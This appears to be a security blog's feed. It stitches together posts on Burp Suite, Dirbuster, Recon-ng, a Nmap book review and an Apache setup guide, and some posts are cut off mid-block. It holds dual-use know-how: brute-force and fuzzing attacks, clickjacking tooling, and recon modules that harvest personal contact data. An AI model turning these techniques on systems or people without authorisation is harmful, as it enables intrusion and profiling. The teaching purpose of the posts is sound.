    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap.png" title="sitemap" alt="target sitemap"></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap-menu.png" title="sitemap menu" alt="target sitemap menu"></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap-filter.png" title="sitemap filter" alt="target sitemap filter"></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/proxy-options.png" title="proxy response options" alt="response modification options"></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/scanner.png" title="burp scanner" alt="burp web scanner"></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/intruder-position.png" title="intruder positions" alt="intruder payload positions"></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters&#8217; case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/repeater.png" title="repeater" alt="repeater"></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sequencer.png" title="Burp sequencer" alt="Burp sequencer"></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/decoder.png" title="Burp decoder" alt="Burp decoder"></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/comparer.png" title="Burp comparer" alt="Burp comparer"></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/extensions.png" title="burp extensions" alt="burp extensions"></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/clickbandit.png" title="burp clickbandit" alt="burp clickbandit"></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

    <updated>2016-09-12T02:21:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>

<!-- more -->


<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>

<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster.png" title="dirbuster" alt="dirbuster interface"></p>

<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>

<h1>Dirbuster configuration</h1>

<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-lists.png" title="dirbuster lists" alt="dirbuster default lists"></p>

<ul>
<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
</ul>


<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>

<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>

<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>

<h2>Dirbuster Options</h2>

<p>In the Options tab, you can further tweak your Dirbuster installation.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-options.png" title="dirbuster options" alt="dirbuster options"></p>

<ul>
<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
</ul>


<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>

<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-html.png" title="dirbuster html options" alt="dirbuster html parsing"></p>

<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-http.png" title="dirbuster http options" alt="dirbuster http options"></p>

<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-scan.png" title="dirbuster scan options" alt="dirbuster scan options"></p>

<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-results.png" title="dirbuster scan results" alt="dirbuster scan results"></p>

<p>You can also see the results in a tree view, for better readability:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dirbuster/dirbuster-tree.png" title="dirbuster tree" alt="dirbuster tree results"></p>

<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>

<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

<span class='line-number'>5</span>

</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; keys add bing_api 007007
</span><span class='line'>[*] Key 'bing_api' added.
</span><span class='line'>[recon-ng][default] &gt; keys list

</span><span class='line'>  +----------------------------+
</span><span class='line'>  | bing_api          | 007007 |</span></code></pre></td></tr></table></div></figure>


<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>

</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default] &gt; show

<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>

<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<ul>
<li><p>Twitter Handles &ndash; Searches Twitter for users that mentioned, or were mentioned by, the given handle.</p></li>
<li><p>Github Code Enumerator &ndash; Uses the Github API to enumerate repositories and gists owned by a Github user. Updates the
&lsquo;repositories&rsquo; table with the results.</p></li>
<li><p>Github Commit Searcher &ndash; Uses the Github API to gather user profiles from repository commits. Updates the &lsquo;profiles&rsquo; table
with the results.</p></li>
<li><p>Github Gist Searcher &ndash; Uses the Github API to download and search Gists for possible information disclosures. Updates the
&lsquo;vulnerabilities&rsquo; table with the results</p></li>
<li><p>Github Dork Analyzer &ndash; Uses the Github API to search for possible vulnerabilites in source code by leveraging Github Dorks
and the &lsquo;repo&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
<li><p>Indeed Resume Crawl &ndash; Crawls Indeed.com for contacts and resumes. Adds name, title, and location to the contacts table and
a link to the resume in the profiles table. Can only harvest the first 1,000 results. Result set
changes, so running the same crawl mutiple times can produce new contacts. If the PAST_EMPS option
is set to true, the module will crawl both current and past employees. Given a keyword, the module
will only harvest contacts whose resumes contain the keyword. (e.g. Linux Admin)</p></li>
<li><p>Meta Data Extractor &ndash; Searches for files associated with the provided domain(s) and extracts any contact related metadata</p></li>
<li><p>HackerTarget Lookup &ndash; Uses the HackerTarget.com API to find host names. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>ThreatCrowd DNS lookup &ndash; Leverages the ThreatCrowd passive DNS API to discover hosts/subdomains.</p></li>
<li><p>Google Hacking Database &ndash; Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
</ul>


<p>This module is massive! Basically, you get Google dorks inside Recon-ng!</p>

    <updated>2016-08-24T06:02:00-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/24/book-review-nmap-network-scanning</id>
    <content type="html"><![CDATA[<p>Recently I have read the so-called Nmap bible, the Nmap Network Scanning book written by the creator of Nmap himself. I&rsquo;ve decided to make
a new section on the blog with the books I&rsquo;m reading and that I find most useful. Needless to say, this was a great book, that has upped my
Nmap game considerably. Right from the start, I highly recommend this as a book that should be in the arsenal of every pentester, system admin,
network engineer or plain old computer guy. The amount of information you get out of it is not constrained to a specific field.</p>

<p><a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717/ref=as_li_ss_il?ie=UTF8&linkCode=li2&tag=sensha10-20&linkId=791bdedacea7ac3bd1caea9852082708" target="_blank"><img src="https://images-na.ssl-images-amazon.com/images/I/51BIsSMZqML._SX382_BO1,204,203,200_.jpg"/></a></p>

<p><strong>Ch. 15. Nmap Reference Guide</strong> &ndash; reference guide to Nmap commands</p>

<p>If you have enjoyed the Stealing the Network series, you will love this one! The style is similar, after all, Fyodor is also a
co-author of that amazing series. The book is sprinkled with fictional stories that illustrate the use of Nmap, along with backstories
of engagements the author has participated in, and case studies of users improving Nmap for certain tasks. All these stories contain great
advice not just on the technical side, but also on best practices. For example, Fyodor stresses the fact of always confirming that the IP range
you received for an engagement actually belongs to the target organization &ndash; or else you might end up  scanning the wrong target..like the army :&ndash;)</p>

<p>There are also plenty of funny comments and geeky stuff, from the friendly tip that &ldquo;using Nmap from your work or school computer to attack
banks and military targets is a bad idea&rdquo; and the technique and Nmap command that Trinity used to scan the Matrix, to life-changing
advice that says &ldquo;In life&rsquo;s bleakest moments when all hope seems to be lost, what should you turn to? Nmap, of course !&rdquo;. By the way, if you are curious,
the above mentioned scan against the Matrix was performed with <code>nmap -v -sS -0 10.2.2.2</code>. Fyodor also made a list on his site of other
movies that showcased the use of Nmap, which you can find at <a href="https://nmap.org/movies/">https://nmap.org/movies/</a></p>

<p>But I&rsquo;m sure that you want to hear about the actual content that will help turn you into a network scanning wizard. There are tons
of resources presented, not just related to Nmap, that can facilitate the information gathering process, such as DNS tools. Every Nmap command
is described in detail, with actual examples of using it, what happens under the hood when you run it, and  the situation where it will come
most in handy. All the command line switches are covered individually, but also in combinations, for comprehensive coverage of different scenarios.</p>

<p>The book also contains a good amount of TCP information and low-level details of both Nmap and network operations in general, along with
beautiful and detailed diagrams. There is information on scrips and how to create your own to enhance Nmap, and also description of the code itself.
At the end, there is a reference guide for all commands. While some of the content is a bit dated, you can get the whole up-to-date information
on the <a href="https://nmap.org/">https://nmap.org/</a> site, for free!</p>

<p>Finally, this awesome book was created with open source tools. Hats off to Fyodor&rsquo;s support to the open source community.</p>

<h3>Flash review</h3>

<ul>
<li><p>in-depth coverage of all Nmap commands, their internals and use cases</p></li>
<li><p>low-level networking internals, comprehensive overview of how Nmap operates in the network environment itself</p></li>
<li><p>introduction to Nmap code and scripting</p></li>
<li><p>the use of the GUI is not neglected</p></li>
<li><p>some dated content, but the updated information is available on the site</p></li>
</ul>


<p>Overall, an excellent book that opened my eyes to the extent one can use Nmap for penetration testing..in fact, with all the scripts that are
available, you can even conduct web app security checks just with Nmap!</p>

    <updated>2016-08-05T07:26:16-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache</id>
    <content type="html"><![CDATA[<p>In this post I will go over the installation and configuration of an Apache web server on CentOS.</p>

<!-- more -->


<h1>Installation</h1>

<p>First, let&rsquo;s verify whether Apache is already installed. Note that on CentOS, the package (and process name) for Apache is called <strong>httpd</strong>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q httpd
</span><span class='line'>package httpd is not installed
</span><span class='line'>ls -l /var/www
</span><span class='line'>ls: cannot access /var/www: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Apache is not installed, so let&rsquo;s install it with <code>yum install httpd</code>. Now verify that it has been installed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q httpd
</span><span class='line'>httpd-2.4.6-40.el7.centos.4.x86_64
</span><span class='line'>ls -l /var/www
</span><span class='line'>total 0
</span><span class='line'>drwxr-xr-x. 2 root root 6 Jul 18 18:30 cgi-bin
</span><span class='line'>drwxr-xr-x. 2 root root 6 Jul 18 18:30 html</span></code></pre></td></tr></table></div></figure>


<p>Remember that the directory for Apache configuration is <code>/etc/httpd</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# ls /etc/httpd
</span><span class='line'>conf  conf.d  conf.modules.d  logs  modules  run</span></code></pre></td></tr></table></div></figure>


<p>And the Apache configuration file is <code>/etc/httpd/conf/httpd.conf</code>. I included a snapshot of a fresh config file at the end of this post.</p>

<h1>Configuration</h1>

<p>Now we can start Apache and check that it is running with the <strong>apachectl</strong> command, that provides a front-end control interface for the httpd daemon. For reference, the man page for this utility is at the end of the post.</p>

<p>To start the web server, type <code>apachectl start</code> (alternatively, you can do it with <code>service httpd start</code>, and can use the httpd daemon directly to pass arguments, etc. At the end I&rsquo;ve also included the httpd man page.</p>

<p>If you&rsquo;re getting a message like &ldquo;Could not reliably determine the server&rsquo;s fully qualified domain name&rdquo;, you can modify the ServerName in the configuration file and then restart the server. After making changes to the config file, it&rsquo;s also a good idea to check if there are any errors in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# apachectl configtest
</span><span class='line'>Syntax OK</span></code></pre></td></tr></table></div></figure>


<p>Now, let&rsquo;s check the status of the server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# apachectl status
</span><span class='line'>* httpd.service - The Apache HTTP Server
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Tue 2016-08-02 15:53:53 EEST; 1min 42s ago
</span><span class='line'>     Docs: man:httpd(8)
</span><span class='line'>           man:apachectl(8)
</span><span class='line'> Main PID: 5941 (httpd)
</span><span class='line'>   Status: "Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec"
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Also, if you want Apache to start on boot, you need to specify it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chkconfig httpd on
</span><span class='line'>Note: Forwarding request to 'systemctl enable httpd.service'.
</span><span class='line'>Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span></code></pre></td></tr></table></div></figure>


<p>If you need to troubleshoot your Apache, you can consult the error log at <code>/var/log/httpd/error_log</code>.</p>

<h2>Site setup</h2>

<p>To add an index for your site, create an <em>index.html</em> file inside <code>/var/www/html/</code>. This is what you&rsquo;ll see when visiting your site.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# echo 'Hello interwebz!' &gt; /var/www/html/index.html</span></code></pre></td></tr></table></div></figure>


<p>When you navigate to your website, this page will be what you&rsquo;ll see. On other distributions, a default index.html may be present in the website root (identified by the DocumentRoot directive).</p>

<h3>Virtual hosts</h3>

<p>Virtual hosts allow you to run multiple websites on a single server. Let&rsquo;s see some examples of how we can do that.</p>

<h4>Port-based vhosts</h4>

<p>One option is to <strong>put each website on a different port</strong>. In addition to our main website on port 80, let&rsquo;s serve a different one on port 8080.</p>

<p>First, add a new Listen directive in <code>/etc/httpd/conf/httpd.conf</code>, to tell Apache to also listen on port 8080:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Listen 80
</span><span class='line'>Listen 8080</span></code></pre></td></tr></table></div></figure>


<p>We could add virtual hosts in the main configuration file, but if you plan to serve many websites, better to create separate configuration files for each virtual host. Check that the line telling Apache to load other config files is uncommented:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Load config files in the "/etc/httpd/conf.d" directory, if any.
</span><span class='line'>IncludeOptional conf.d/*.conf</span></code></pre></td></tr></table></div></figure>


<p>Now, create a config file for a specific virtual host (it must end in .conf):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# nano /etc/httpd/conf.d/skynet.conf
</span><span class='line'>[root@freehat ~]# cat /etc/httpd/conf.d/skynet.conf
</span><span class='line'>&lt;VirtualHost *:8080&gt;
</span><span class='line'>    DocumentRoot "/var/www/html/skynet"
</span><span class='line'>    ServerName skynet.local
</span><span class='line'>&lt;/VirtualHost&gt;</span></code></pre></td></tr></table></div></figure>


<p>Next, create the necessary document root directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# mkdir /var/www/html/skynet</span></code></pre></td></tr></table></div></figure>


<p>Put some resource that you want to be server in the folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

